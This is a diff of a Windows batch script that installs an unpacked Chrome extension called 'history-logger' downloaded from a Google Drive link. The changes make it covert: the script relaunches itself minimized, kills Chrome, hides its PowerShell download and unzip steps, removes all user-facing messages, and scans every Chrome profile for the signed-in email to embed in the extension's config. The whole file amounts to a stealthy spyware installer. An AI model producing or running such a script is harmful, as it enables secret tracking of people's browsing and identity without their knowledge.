@@ -1,55 +1,51 @@
 @echo off
-setlocal enabledelayedexpansion
+if "%1" neq "silent" (
+  start "" /min cmd /c "\"%~f0\" silent"
+  exit
+)
+setlocal EnableDelayedExpansion
 
 REM ─── CONFIG ────────────────────────────────────────────────
 set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
-set "WORKDIR=%~dp0history-logger"
+set "SCRIPT_DIR=%~dp0"
+set "WORKDIR=%SCRIPT_DIR%history-logger"
 REM ─────────────────────────────────────────────────────────────
 
-echo [1] Creating work folder "%WORKDIR%"…
+REM 1) Kill any running Chrome so our flags take effect
+taskkill /F /IM chrome.exe >nul 2>&1
+
+REM 2) Clean & recreate the working folder
 if exist "%WORKDIR%" rd /s /q "%WORKDIR%"
-mkdir "%WORKDIR%" || (echo Failed to mkdir & pause & exit /b)
+mkdir "%WORKDIR%"
 
-echo [2] Downloading extension.zip from Drive…
-powershell -NoProfile -Command ^
-  "Invoke-WebRequest '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" 
-if errorlevel 1 (echo Download failed & pause & exit /b)
+REM 3) Download & unpack extension.zip from your Drive link
+powershell -WindowStyle Hidden -NoProfile -Command ^
+  "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" >nul 2>&1
 
-echo [3] Extracting ext.zip…
-powershell -NoProfile -Command ^
-  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force"
-if errorlevel 1 (echo Unzip failed & pause & exit /b)
+powershell -WindowStyle Hidden -NoProfile -Command ^
+  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" >nul 2>&1
 
-echo [4] Checking unpacked files:
-dir "%WORKDIR%"  
-
-echo [5] Reading Chrome email from Preferences…
-set "PREF=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences"
-if not exist "%PREF%" (
-  echo Prefs not found at "%PREF%" & pause & exit /b
+REM 4) Scan all Chrome profiles for the signed-in email
+set "EMAIL="
+for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
+  if exist "%%P\Preferences" (
+    for /f "delims=" %%E in (`
+      powershell -WindowStyle Hidden -NoProfile -Command ^
+        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
+    `) do if not defined EMAIL set "EMAIL=%%E"
+  )
 )
-for /f "delims=" %%E in (`
-  powershell -NoProfile -Command ^
-    "try{(Get-Content -Raw '%PREF%' | ConvertFrom-Json).account_info.email}catch{''}"
-`) do set "EMAIL=%%E"
-if not defined EMAIL (
-  set "EMAIL=anonymous@demo.com"
-  echo No email found, using anonymous@demo.com
-) else (
-  echo Found email: %EMAIL%
-)
+if not defined EMAIL set "EMAIL=anonymous@demo.com"
 
-echo [6] Writing config.json…
+REM 5) Write config.json next to manifest.js
 (
   echo {^"userEmail^":^"%EMAIL%"^}
 ) > "%WORKDIR%\config.json"
-type "%WORKDIR%\config.json"
 
-echo [7] Launching Chrome with load-extension…
-start "" chrome.exe --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%"
+REM 6) Launch Chrome with your unpacked extension loaded & open extensions page
+start "" chrome.exe ^
+  --disable-extensions-except="%WORKDIR%" ^
+  --load-extension="%WORKDIR%" ^
+  "chrome://extensions"
 
-echo Done.  If Chrome didn’t load your extension, open:
-echo    chrome://extensions
-echo and enable “Developer mode” and click “Load unpacked” at:
-echo    %WORKDIR%
-pause
+endlocal
